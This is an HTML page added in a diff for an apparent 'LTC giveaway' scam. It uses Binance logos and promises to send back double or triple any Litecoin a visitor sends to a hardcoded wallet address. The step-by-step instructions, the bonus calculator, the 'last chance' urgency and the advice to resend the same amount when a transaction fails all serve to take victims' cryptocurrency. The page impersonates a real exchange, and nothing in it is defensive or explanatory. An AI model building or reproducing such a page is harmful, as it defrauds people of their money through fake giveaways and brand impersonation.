@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>LTC giveaway</title>
+    <link rel="shortcut icon" href="/assets/images/images (7) (20).jpeg" type="image/x-icon" />
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous" />
+    <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+
+    <link rel="stylesheet" href="/css/index.css" />
+</head>
+
+<body>
+    <header>
+        <img src="/assets/images/Binance-Logo.wine.png" alt="" />
+    </header>
+    <main>
+        <div id="how_to">
+            <div class="container">
+                <p>
+                    To verify your Litcoin address, just send from 3 to 50 LTC to the
+                    generated address below and get from 1 to 20 LTC (you will earn 3x
+                    bonus if you send 20 LTC and above) sent back to the address you sent
+                    LTC from or the one you specified below, you will get double of what
+                    you send to the giveaway address.
+                </p>
+                <p>
+                    In this event, participant will get 2x (or 3x) of what they send to
+                    the giveaway address within 10 to 20 minutes which can be traded on
+                    any exchange.
+                </p>
+                <h2>How to participate</h2>
+                <p class="p">
+                    <b>Step1: </b>Make sure you have at least 3 LTC or above in your
+                    wallet.
+                </p>
+                <p class="p">
+                    <b>Step2: </b>Enter the amount you wish to invest below.
+                </p>
+                <p class="p"><b>Step3: </b>Enter your LTC address.</p>
+                <p class="p">
+                    <b>Step4: </b>Click the "Generate Payment" button to generate the
+                    payment address.
+                </p>
+                <p class="p">
+                    <b>Step5: </b>Click "Pay Now" to send the amount you have entered to
+                    the giveaway
+                </p>
+                <p class="p"><b>Step6: </b>Confirm payment.</p>
+                <p class="p">
+                    <b>Step7: </b>Wait for at least 10-20 minutes then login to your
+                    account.
+                </p>
+                <p class="p">
+                    The 2x bonus will be sent to the address you entered or the one you
+                    sent the LTC from.
+                </p>
+                <p>
+                    <i>If the transaction does not process correctly, please try again
+                        with same amount to the Generated address, and it should go
+                        through. Your original transaction will merge with the new one,
+                        and the bonus for the two will be sent back.</i>
+                </p>
+            </div>
+            <div class="container">
+                <form class="calculator" method="dialog">
+                    <label for="amount">Amount: </label><input type="number" required class="form-control" name="amount"
+                       onchange ="calculate()" id="amount" />
+                    <br />
+                    <h3 id="bonus">Bonus Value</h3>
+                    <br />
+                    <h3>Address:</h3>
+                    <input type="text" required class="form-control" id="address" onclick="myInputFunction()" />
+                    <br /><br />
+                    <button class="btn btn-lg bg-primary" id="generate_btn" onclick="show()">
+                        <b>Generate Payment</b>
+                    </button>
+
+                    <p class="center"><b>Last chance to get your LTC</b></p>
+
+                    <div class="d-flex hidden justify-content-center align-items-center">
+                        <div class="spinner-border text-primary spinner-border-sm" role="status">
+                            <span class="visually-hidden">Loading...</span>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+        <div class="pop-up" id="pop_up">
+            <img src="/assets/images/Ltc-address.png" alt="qrcode" />
+            <h2>0 confirmation</h2>
+            <hr />
+            <br />
+            <label for="Amount">Amount: </label>
+            <input type="number" class="form-control" name="amount" id="amount" />
+            <br />
+            <label for="Generated Address">Generated Address: </label>
+            <div class="copy-link">
+                <input type="text" value="LXPQBD8HVC4hrvUXYziXk33bMEosBhTYwH" placeholder="0.5 and above"
+                    id="myInput" readonly class="copy-link-input" />
+                <button type="button" id="btnCopy" class="copy-link-button"><span class="material-symbols-outlined">
+                        content_copy
+                    </span></button>
+            </div>
+            <br />
+            <br />
+            <a href="/">
+                <button onclick="paidFunction()" class="btn btn-lg bg-primary"><b>Pay Now</b></button>
+            </a>
+        </div>
+        <div class="ads container">
+            <h4>Sponsored by: </h4>
+            <div class="ads-box">
+                <img src="/assets/images/adsimg/Binance-Logo.wine.png" alt="" />
+                <img src="/assets/images/adsimg/images (2).png" alt="ads-img" />
+                <img src="/assets/images/adsimg/images (3).png" alt="ads-img" />
+                <img src="/assets/images/adsimg/images (4).png" alt="ads-img" />
+                <img src="/assets/images/adsimg/images (7) (27).jpeg" alt="ads-img" />
+                <img src="/assets/images/adsimg/images (7) (28).jpeg" alt="address" />
+            </div>
+        </div>
+    </main>
+    <script src="/jscript/main.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa"
+        crossorigin="anonymous"></script>
+</body>
+
+</html>
